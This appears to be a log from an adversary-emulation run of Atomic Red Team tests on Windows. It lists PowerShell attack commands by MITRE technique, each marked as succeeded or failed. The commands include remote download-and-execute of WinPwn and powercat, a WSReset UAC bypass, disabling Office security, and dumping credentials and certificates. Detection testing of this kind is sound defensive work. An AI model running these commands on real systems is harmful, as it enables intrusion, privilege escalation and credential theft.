                'New-WebGlobalModule to install a new IIS Module. IIS must be '
                'installed.\n'
                'This atomic utilizes a DLL on disk, but to test further '
                'suspiciousness, compile and load '
                '[IIS-Raid](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/).\n'
                'A successful execution will install a module into IIS using '
                'New-WebGlobalModule.\n'
                '[Managing IIS Modules with '
                'PowerShell](https://learn.microsoft.com/en-us/powershell/module/webadministration/set-webglobalmodule?view=windowsserver2022-ps)\n'
                '[IIS '
                'Modules](https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/)\n',
 'executor': 'psh',
 'link_id': '70e54da1-5071-4b48-acf0-c9becb328117',
 'name': 'Install IIS Module using PowerShell Cmdlet New-WebGlobalModule',
 'pid': 10868,
 'plaintext_command': 'New-WebGlobalModule -Name DefaultDocumentModule_Atomic '
                      '-Image %windir%\\system32\\inetsrv\\defdoc.dll',
 'platform': 'windows',
 'run': '2023-12-01T12:20:32Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1526__discovery__cloud_service_discovery__e78bde5dfb72eb88083c3717ce2fc8c7__trial_1

atomic_ordering: ['e78bde5dfb72eb88083c3717ce2fc8c7']
==============================
==============================
adversary_id: atomic__t1046__discovery__network_service_discovery__9381d0e0efbf5bf89a9e512f8b3745f4__trial_1

atomic_ordering: ['9381d0e0efbf5bf89a9e512f8b3745f4']
------------------------------
{'ability_id': '9381d0e0efbf5bf89a9e512f8b3745f4',
 'agent_reported_time': '2023-11-11T13:09:57Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1046',
            'technique_name': 'Network Service Discovery'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'bluekeep -noninteractive -consoleoutput',
 'delegated': '2023-11-27T18:46:33Z',
 'description': 'Search for bluekeep vulnerable Windows Systems in the domain '
                'using bluekeep function of WinPwn. Can take many minutes to '
                'complete (~600 seconds in testing on a small domain).',
 'executor': 'psh',
 'link_id': 'ec2c16f9-319c-427c-b147-ec625eb3b1db',
 'name': 'WinPwn - bluekeep',
 'pid': 5416,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'bluekeep -noninteractive -consoleoutput',
 'platform': 'windows',
 'run': '2023-11-27T18:47:02Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1119__collection__automated_collection__344e7eaf650763e0d3e9f02e62c1cf4b__trial_1

atomic_ordering: ['344e7eaf650763e0d3e9f02e62c1cf4b']
------------------------------
{'ability_id': '344e7eaf650763e0d3e9f02e62c1cf4b',
 'agent_reported_time': '2023-11-11T13:09:04Z',
 'attack': {'tactic': 'collection',
            'technique_id': 'T1119',
            'technique_name': 'Automated Collection'},
 'command': 'Get-Service > $env:TEMP\\T1119_1.txt; Get-ChildItem Env: > '
            '$env:TEMP\\T1119_2.txt; Get-Process > $env:TEMP\\T1119_3.txt',
 'delegated': '2023-11-30T03:45:43Z',
 'description': 'collect information for exfiltration. Upon execution, check '
                'the users temp directory (%temp%) for files T1119_*.txt\n'
                'to see what was collected.\n',
 'executor': 'psh',
 'link_id': 'c1d06b7c-b68a-4324-b524-d67bd717bdfa',
 'name': 'Recon information for export with PowerShell',
 'pid': 4768,
 'plaintext_command': 'Get-Service > $env:TEMP\\T1119_1.txt; Get-ChildItem '
                      'Env: > $env:TEMP\\T1119_2.txt; Get-Process > '
                      '$env:TEMP\\T1119_3.txt',
 'platform': 'windows',
 'run': '2023-11-30T03:46:04Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1218__defense-evasion__signed_binary_proxy_execution__1c4576eb8d4cea58c18e4b087d9c9ac0__trial_1

atomic_ordering: ['1c4576eb8d4cea58c18e4b087d9c9ac0']
==============================
==============================
adversary_id: atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__c0177717b47f2cd07949186523fa3c6b__trial_1

atomic_ordering: ['c0177717b47f2cd07949186523fa3c6b']
------------------------------
{'ability_id': 'c0177717b47f2cd07949186523fa3c6b',
 'agent_reported_time': '2023-11-11T13:08:48Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1059.001',
            'technique_name': 'Command and Scripting Interpreter: PowerShell'},
 'command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
            '-ListAvailable; if (-not $RequiredModule) {Install-Module -Name '
            'AtomicTestHarnesses -Scope CurrentUser -Force};  ;  '
            'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType '
            'Hyphen -CommandParamVariation C -Execute -ErrorAction Stop',
 'delegated': '2023-11-28T08:16:41Z',
 'description': 'Executes powershell.exe with variations of the -Command '
                'parameter',
 'executor': 'psh',
 'link_id': '7a90de31-c002-43a8-b702-d1d6014336e5',
 'name': 'ATHPowerShellCommandLineParameter -Command parameter variations',
 'pid': 2496,
 'plaintext_command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
                      '-ListAvailable; if (-not $RequiredModule) '
                      '{Install-Module -Name AtomicTestHarnesses -Scope '
                      'CurrentUser -Force};  ;  '
                      'Out-ATHPowerShellCommandLineParameter '
                      '-CommandLineSwitchType Hyphen -CommandParamVariation C '
                      '-Execute -ErrorAction Stop',
 'platform': 'windows',
 'run': '2023-11-28T08:17:38Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__64430e7597668877a832b9d1e379c9f2__trial_1

atomic_ordering: ['64430e7597668877a832b9d1e379c9f2']
------------------------------
{'ability_id': '64430e7597668877a832b9d1e379c9f2',
 'agent_reported_time': '2023-11-11T13:09:44Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1548.002',
            'technique_name': 'Abuse Elevation Control Mechanism: Bypass User '
                              'Account Control'},
 'command': 'New-Item '
            'HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command '
            '-Force | Out-Null; New-ItemProperty -Path '
            'HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command '
            '-Name "DelegateExecute" -Value "" -Force | Out-Null; '
            'Set-ItemProperty -Path '
            'HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command '
            '-Name "(default)" -Value "C:\\Windows\\System32\\cmd.exe /c start '
            'cmd.exe" -Force -ErrorAction SilentlyContinue | Out-Null; '
            '$Process = Start-Process -FilePath '
            '"C:\\Windows\\System32\\WSReset.exe" -WindowStyle Hidden',
 'delegated': '2023-12-02T10:34:20Z',
 'description': 'The following UAC bypass is focused on a registry key under '
                '"HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command" '
                'that will trigger a command once wsreset.exe runs. \n'
                'This bypass is limited to Windows 10 1803/1809 and may not '
                'run on Server platforms. The registry mod is where interest '
                'will be.\n'
                'If successful, the command to run will spawn off '
                'wsreset.exe. \n'
                '[UAC Bypass in Windows 10 Store '
                'Binary](https://0x1.gitlab.io/exploit/UAC-Bypass-in-Windows-10-Store-Binary/)\n',
 'executor': 'psh',
 'link_id': 'a0fc4e57-ab2c-4469-aade-36f50f11ca4a',
 'name': 'UAC Bypass with WSReset Registry Modification',
 'pid': 7444,
 'plaintext_command': 'New-Item '
                      'HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command '
                      '-Force | Out-Null; New-ItemProperty -Path '
                      'HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command '
                      '-Name "DelegateExecute" -Value "" -Force | Out-Null; '
                      'Set-ItemProperty -Path '
                      'HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command '
                      '-Name "(default)" -Value '
                      '"C:\\Windows\\System32\\cmd.exe /c start cmd.exe" '
                      '-Force -ErrorAction SilentlyContinue | Out-Null; '
                      '$Process = Start-Process -FilePath '
                      '"C:\\Windows\\System32\\WSReset.exe" -WindowStyle '
                      'Hidden',
 'platform': 'windows',
 'run': '2023-12-02T10:34:28Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1095__command-and-control__non-application_layer_protocol__981cf81e3bb0649fafc31217c8cbc00d__trial_1

atomic_ordering: ['981cf81e3bb0649fafc31217c8cbc00d']
------------------------------
{'ability_id': '981cf81e3bb0649fafc31217c8cbc00d',
 'agent_reported_time': '2023-11-11T13:10:14Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1095',
            'technique_name': 'Non-Application Layer Protocol'},
 'command': 'IEX (New-Object '
            "System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1'); "
            'powercat -c',
 'delegated': '2023-11-29T10:22:36Z',
 'description': 'Start C2 Session Using Powercat\n'
                'To start the listener on a Linux device, type the '
                'following: \n'
                'nc -l -p <port>\n',
 'executor': 'psh',
 'link_id': '50de566a-5d77-40df-83ae-426e8f8974ae',
 'name': 'Powercat C2',
 'pid': 7136,
 'plaintext_command': 'IEX (New-Object '
                      "System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1'); "
                      'powercat -c',
 'platform': 'windows',
 'run': '2023-11-29T10:23:08Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__b66a6eed7d46ab2ca4c3bf1ae3b61f44__trial_1

atomic_ordering: ['b66a6eed7d46ab2ca4c3bf1ae3b61f44']
------------------------------
{'ability_id': 'b66a6eed7d46ab2ca4c3bf1ae3b61f44',
 'agent_reported_time': '2023-11-11T13:10:39Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.001',
            'technique_name': 'Impair Defenses: Disable or Modify Tools'},
 'command': 'New-Item -Path "HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel"; '
            'New-Item -Path '
            '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security"; '
            'New-Item -Path '
            '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView"; '
            'New-ItemProperty -Path '
            '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security" -Name '
            '"VBAWarnings" -Value "1" -PropertyType "Dword"; New-ItemProperty '
            '-Path '
            '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView" '
            '-Name "DisableInternetFilesInPV" -Value "1" -PropertyType '
            '"Dword"; New-ItemProperty -Path '
            '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView" '
            '-Name "DisableUnsafeLocationsInPV" -Value "1" -PropertyType '
            '"Dword"; New-ItemProperty -Path '
            '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView" '
            '-Name "DisableAttachementsInPV" -Value "1" -PropertyType "Dword"',
 'delegated': '2023-12-03T12:08:16Z',
 'description': 'Gorgon group may disable Office security features so that '
                'their code can run. Upon execution, an external document will '
                'not\n'
                'show any warning before editing the document.\n'
                '\n'
                '\n'
                'https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n',
 'executor': 'psh',
 'link_id': '3587e04e-200b-4c21-b8f4-e0a7bfa87ad0',
 'name': 'Disable Microsoft Office Security Features',
 'pid': 10992,
 'plaintext_command': 'New-Item -Path '
                      '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel"; '
                      'New-Item -Path '
                      '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security"; '
                      'New-Item -Path '
                      '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView"; '
                      'New-ItemProperty -Path '
                      '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security" '
                      '-Name "VBAWarnings" -Value "1" -PropertyType "Dword"; '
                      'New-ItemProperty -Path '
                      '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView" '
                      '-Name "DisableInternetFilesInPV" -Value "1" '
                      '-PropertyType "Dword"; New-ItemProperty -Path '
                      '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView" '
                      '-Name "DisableUnsafeLocationsInPV" -Value "1" '
                      '-PropertyType "Dword"; New-ItemProperty -Path '
                      '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView" '
                      '-Name "DisableAttachementsInPV" -Value "1" '
                      '-PropertyType "Dword"',
 'platform': 'windows',
 'run': '2023-12-03T12:09:03Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1112__defense-evasion__modify_registry__f4d3c5648b8d2fab9b061016eb91f478__trial_1

atomic_ordering: ['f4d3c5648b8d2fab9b061016eb91f478']
------------------------------
{'ability_id': 'f4d3c5648b8d2fab9b061016eb91f478',
 'agent_reported_time': '2023-11-11T13:10:03Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1112',
            'technique_name': 'Modify Registry'},
 'command': '$typicalPath = "HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds"; '
            '$randomBytes = New-Object Byte[] 0x1000; (New-Object '
            'Random).NextBytes($randomBytes); New-ItemProperty -Path '
            '$typicalPath -Name "AtomicSnake" -Value $randomBytes '
            '-PropertyType Binary -Force | Out-Null',
 'delegated': '2023-11-30T01:11:52Z',
 'description': 'The following Atomic Test creates a registry blob in '
                'HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds, which is '
                'related to Snake Malware. Per the report, upon execution, '
                "Snake's WerFault.exe will attempt to decrypt an encrypted "
                'blob within the Windows\n'
                'registry that is typically found at '
                'HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds. The '
                'encrypted data includes the AES key, IV, and path that is '
                "used to find and decrypt the file containing Snake's kernel "
                'driver and kernel driver loader.\n',
 'executor': 'psh',
 'link_id': 'c16cdb83-0833-4496-b1ff-3c8382d0590a',
 'name': 'Snake Malware Registry Blob',
 'pid': 7444,
 'plaintext_command': '$typicalPath = '
                      '"HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds"; '
                      '$randomBytes = New-Object Byte[] 0x1000; (New-Object '
                      'Random).NextBytes($randomBytes); New-ItemProperty -Path '
                      '$typicalPath -Name "AtomicSnake" -Value $randomBytes '
                      '-PropertyType Binary -Force | Out-Null',
 'platform': 'windows',
 'run': '2023-11-30T01:12:29Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1090_001__command-and-control__proxy-_internal_proxy__b0eb5108debf92ed5707a964b2bf3481__trial_1

atomic_ordering: ['b0eb5108debf92ed5707a964b2bf3481']
------------------------------
{'ability_id': 'b0eb5108debf92ed5707a964b2bf3481',
 'agent_reported_time': '2023-11-11T13:09:50Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1090.001',
            'technique_name': 'Proxy: Internal Proxy'},
 'command': 'netsh interface portproxy add v4tov4 listenport=1337 '
            'connectport=1337 connectaddress=127.0.0.1',
 'delegated': '2023-11-29T08:47:47Z',
 'description': 'Adds a registry key to set up a proxy on the endpoint at '
                'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\n'
                'Upon execution there will be a new proxy entry in netsh\n'
                'netsh interface portproxy show all\n',
 'executor': 'psh',
 'link_id': 'aac39195-7b8f-4d30-9724-7d9b25adc9c4',
 'name': 'portproxy reg key',
 'pid': 5416,
 'plaintext_command': 'netsh interface portproxy add v4tov4 listenport=1337 '
                      'connectport=1337 connectaddress=127.0.0.1',
 'platform': 'windows',
 'run': '2023-11-29T08:48:17Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1021_006__lateral-movement__remote_services-_windows_remote_management__dce08779676c01d98885e164a1176ac8__trial_1

atomic_ordering: ['dce08779676c01d98885e164a1176ac8']
------------------------------
{'ability_id': 'dce08779676c01d98885e164a1176ac8',
 'agent_reported_time': '2023-11-11T13:10:24Z',
 'attack': {'tactic': 'lateral-movement',
            'technique_id': 'T1021.006',
            'technique_name': 'Remote Services: Windows Remote Management'},
 'command': 'evil-winrm -i Target -u Domain\\Administrator -p P@ssw0rd1',
 'delegated': '2023-11-27T10:39:12Z',
 'description': 'An adversary may attempt to use Evil-WinRM with a valid '
                'account to interact with remote systems that have WinRM '
                'enabled',
 'executor': 'psh',
 'link_id': 'c85a4da0-8dc1-440f-adb8-e1db5d804c81',
 'name': 'WinRM Access with Evil-WinRM',
 'pid': 8224,
 'plaintext_command': 'evil-winrm -i Target -u Domain\\Administrator -p '
                      'P@ssw0rd1',
 'platform': 'windows',
 'run': '2023-11-27T10:40:14Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1027__defense-evasion__obfuscated_files_or_information__ed172018f897dab90147a47995ce197d__trial_1

atomic_ordering: ['ed172018f897dab90147a47995ce197d']
------------------------------
{'ability_id': 'ed172018f897dab90147a47995ce197d',
 'agent_reported_time': '2023-11-11T13:09:51Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1027',
            'technique_name': 'Obfuscated Files or Information'},
 'command': '$cmDwhy =[TyPe]("{0}{1}" -f \'S\',\'TrING\')  ;   $pz2Sb0  '
            '=[TYpE]("{1}{0}{2}"-f\'nv\',\'cO\',\'ert\')  ;  '
            '&("{0}{2}{3}{1}{4}" -f\'In\',\'SiO\',\'vOKe-EXp\',\'ReS\',\'n\') '
            '(  (&("{1}{2}{0}"-f\'blE\',\'gET-\',\'vaRIA\')  '
            '(\'CMdw\'+\'h\'+\'y\'))."v`ALUe"::("{1}{0}" '
            "-f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 "
            ',163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , '
            '157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , '
            '41,47)| .(\'%\') { ( [CHAR] (  $Pz2sB0::"t`OinT`16"(( '
            '[sTring]${_}) ,8)))})) )',
 'delegated': '2023-11-27T13:14:29Z',
 'description': 'This is an obfuscated PowerShell command which when executed '
                'prints "Hello, from PowerShell!". Example is from the 2021 '
                'Threat Detection Report by Red Canary.\n',
 'executor': 'psh',
 'link_id': '17ce4331-c3a6-4505-91e5-76567d057bcf',
 'name': 'Obfuscated Command in PowerShell',
 'pid': 8644,
 'plaintext_command': '$cmDwhy =[TyPe]("{0}{1}" -f \'S\',\'TrING\')  ;   '
                      '$pz2Sb0  =[TYpE]("{1}{0}{2}"-f\'nv\',\'cO\',\'ert\')  '
                      ';  &("{0}{2}{3}{1}{4}" '
                      "-f'In','SiO','vOKe-EXp','ReS','n') (  "
                      '(&("{1}{2}{0}"-f\'blE\',\'gET-\',\'vaRIA\')  '
                      '(\'CMdw\'+\'h\'+\'y\'))."v`ALUe"::("{1}{0}" '
                      "-f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , "
                      '110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , '
                      '54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 '
                      ",123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] "
                      '(  $Pz2sB0::"t`OinT`16"(( [sTring]${_}) ,8)))})) )',
 'platform': 'windows',
 'run': '2023-11-27T13:14:42Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1218_011__defense-evasion__signed_binary_proxy_execution-_rundll32__16e96b0f0c0021663b2f5dfafabee6f0__trial_1

atomic_ordering: ['16e96b0f0c0021663b2f5dfafabee6f0']
------------------------------
{'ability_id': '16e96b0f0c0021663b2f5dfafabee6f0',
 'agent_reported_time': '2023-11-11T13:10:36Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.011',
            'technique_name': 'Signed Binary Proxy Execution: Rundll32'},
 'command': 'rundll32.exe C:\\Users\\$env:username\\Downloads\\calc.png, '
            'StartW',
 'delegated': '2023-12-01T02:18:46Z',
 'description': 'Rundll32.exe running non-dll \n',
 'executor': 'psh',
 'link_id': '7b3a1310-3487-4ce3-ba46-1c270dac26fd',
 'name': 'Execution of non-dll using rundll32.exe',
 'pid': 5172,
 'plaintext_command': 'rundll32.exe '
                      'C:\\Users\\$env:username\\Downloads\\calc.png, StartW',
 'platform': 'windows',
 'run': '2023-12-01T02:20:35Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1552_004__credential-access__unsecured_credentials-_private_keys__000549902a51ef21f57d3d28a6e5ecc0__trial_1

atomic_ordering: ['000549902a51ef21f57d3d28a6e5ecc0']
------------------------------
{'ability_id': '000549902a51ef21f57d3d28a6e5ecc0',
 'agent_reported_time': '2023-11-11T13:10:23Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1552.004',
            'technique_name': 'Unsecured Credentials: Private Keys'},
 'command': 'IEX (IWR '
            "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' "
            '-UseBasicParsing) ; certutil.exe -p password -exportPFX Root '
            '1F3D38F280635F275BE92B87CF83E40E40458400 c:\\temp\\atomic.pfx',
 'delegated': '2023-12-02T16:24:20Z',
 'description': 'The following Atomic test simulates adding a generic '
                'non-malicious certificate to the Root certificate store. This '
                'behavior generates a registry modification that adds the '
                'cloned root CA certificate in the keys outlined in the blog. '
                'In addition, this Atomic utilizes CertUtil to export the PFX '
                '(ExportPFX), similar to what was seen in the Golden SAML '
                'attack.\n'
                'Keys will look like - \\SystemCertificates\\CA\\Certificates '
                'or \\SystemCertificates\\Root\\Certificates\n'
                'Reference: '
                'https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\n'
                'Reference: '
                'https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html\n',
 'executor': 'psh',
 'link_id': 'a5c44f60-9f95-4378-9285-c799945ed8e1',
 'name': 'CertUtil ExportPFX',
 'pid': 6340,
 'plaintext_command': 'IEX (IWR '
                      "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' "
                      '-UseBasicParsing) ; certutil.exe -p password -exportPFX '
                      'Root 1F3D38F280635F275BE92B87CF83E40E40458400 '
                      'c:\\temp\\atomic.pfx',
 'platform': 'windows',
 'run': '2023-12-02T16:25:16Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1021_006__lateral-movement__remote_services-_windows_remote_management__7844eb9751d121b16f9517817a31eee4__trial_1

atomic_ordering: ['7844eb9751d121b16f9517817a31eee4']
------------------------------
{'ability_id': '7844eb9751d121b16f9517817a31eee4',
 'agent_reported_time': '2023-11-11T13:10:05Z',
 'attack': {'tactic': 'lateral-movement',
            'technique_id': 'T1021.006',
            'technique_name': 'Remote Services: Windows Remote Management'},
 'command': 'Enable-PSRemoting -Force; Invoke-Command -ComputerName '
            '$env:COMPUTERNAME -ScriptBlock {whoami}',
 'delegated': '2023-11-27T10:20:00Z',
 'description': 'Simulate lateral movement with PowerShell Remoting on the '
                'local host. \n'
                'Upon successful execution, PowerShell will execute `whoami` '
                'using `Invoke-Command`, targeting the \n'
                'local machine as remote target.\n',
 'executor': 'psh',
 'link_id': '677d5268-eae3-4aec-8749-a30a37e0e8ef',
 'name': 'Remote Code Execution with PS Credentials Using Invoke-Command',
 'pid': 7192,
 'plaintext_command': 'Enable-PSRemoting -Force; Invoke-Command -ComputerName '
                      '$env:COMPUTERNAME -ScriptBlock {whoami}',
 'platform': 'windows',
 'run': '2023-11-27T10:20:24Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1555__credential-access__credentials_from_password_stores__f5606cc7632289d5ca72d4a485c14f6b__trial_1

atomic_ordering: ['f5606cc7632289d5ca72d4a485c14f6b']
------------------------------
{'ability_id': 'f5606cc7632289d5ca72d4a485c14f6b',
 'agent_reported_time': '2023-11-11T13:09:56Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1555',
            'technique_name': 'Credentials from Password Stores'},
 'command': 'vaultcmd /listcreds:"Web Credentials" /all',
 'delegated': '2023-12-03T03:26:21Z',
 'description': 'This module will enumerate credentials stored in Web '
                'Credentials vault of Windows Credential Manager using builtin '
                'utility vaultcmd.exe',
 'executor': 'psh',
 'link_id': 'debd1f98-b906-4dae-a435-0cfd80acebae',
 'name': 'Enumerate credentials from Windows Credential Manager using '
         'vaultcmd.exe [Web Credentials]',
 'pid': 10020,
 'plaintext_command': 'vaultcmd /listcreds:"Web Credentials" /all',
 'platform': 'windows',
 'run': '2023-12-03T03:26:28Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__954860df5054a5fabc114abefd8e45f6__trial_1

atomic_ordering: ['954860df5054a5fabc114abefd8e45f6']
------------------------------
{'ability_id': '954860df5054a5fabc114abefd8e45f6',
 'agent_reported_time': '2023-11-11T13:10:03Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1555.003',
            'technique_name': 'Credentials from Password Stores: Credentials '
                              'from Web Browsers'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'browserpwn -consoleoutput -noninteractive',
 'delegated': '2023-12-02T23:12:25Z',
 'description': 'Collect Browser credentials as well as the history via winpwn '
                'browserpwn function of WinPwn.',
 'executor': 'psh',
 'link_id': '1e8d02c9-f838-4d12-ab72-f3cc236e95ce',
 'name': 'WinPwn - BrowserPwn',
 'pid': 4532,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'browserpwn -consoleoutput -noninteractive',
 'platform': 'windows',
 'run': '2023-12-02T23:12:55Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1546_003__multiple__event_triggered_execution-_windows_management_instrumentation_event_subscription__248be98ef985ef5053a26ed7cd929c14__trial_1

atomic_ordering: ['248be98ef985ef5053a26ed7cd929c14']
------------------------------
{'ability_id': '248be98ef985ef5053a26ed7cd929c14',
 'agent_reported_time': '2023-11-11T13:10:09Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1546.003',
            'technique_name': 'Event Triggered Execution: Windows Management '
                              'Instrumentation Event Subscription'},
 'command': 'c:\\windows\\system32\\wbem\\mofcomp.exe "715d8f_T1546.003.mof"',
 'delegated': '2023-12-01T18:29:20Z',
 'description': 'The following Atomic will utilize MOFComp.exe to load a local '
                'MOF file.\n'
                'The Managed Object Format (MOF) compiler parses a file '
                'containing MOF statements and adds the classes and class '
                'instances defined in the file to the WMI repository. \n'
                'To query for the class:  gwmi __eventfilter -namespace '
                'root\\subscription\n'
                'A successful execution will add the class to WMI root '
                'namespace.\n'
                'Reference: '
                'https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/ '
                'and '
                'https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/.\n',
 'executor': 'psh',
 'link_id': '977895f8-932a-4d82-8d5b-a8e2f31c2cb0',
 'name': 'Windows MOFComp.exe Load MOF File',
 'pid': 6480,
 'plaintext_command': 'c:\\windows\\system32\\wbem\\mofcomp.exe '
                      '"715d8f_T1546.003.mof"',
 'platform': 'windows',
 'run': '2023-12-01T18:29:34Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1204_002__execution__user_execution-_malicious_file__03a80d4a4c02d99295b5901ee695cc79__trial_1

atomic_ordering: ['03a80d4a4c02d99295b5901ee695cc79']
------------------------------
{'ability_id': '03a80d4a4c02d99295b5901ee695cc79',
 'agent_reported_time': '2023-11-11T13:10:35Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1204.002',
            'technique_name': 'User Execution: Malicious File'},
 'command': 'Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe '
            '-OutFile $env:TEMP/PotentiallyUnwanted.exe; & '
            '"$env:TEMP/PotentiallyUnwanted.exe"',
 'delegated': '2023-11-30T14:02:01Z',
 'description': 'The Potentially Unwanted Applications (PUA) protection '
                'feature in antivirus software can identify and block PUAs '
                'from downloading and installing on endpoints in your network. '
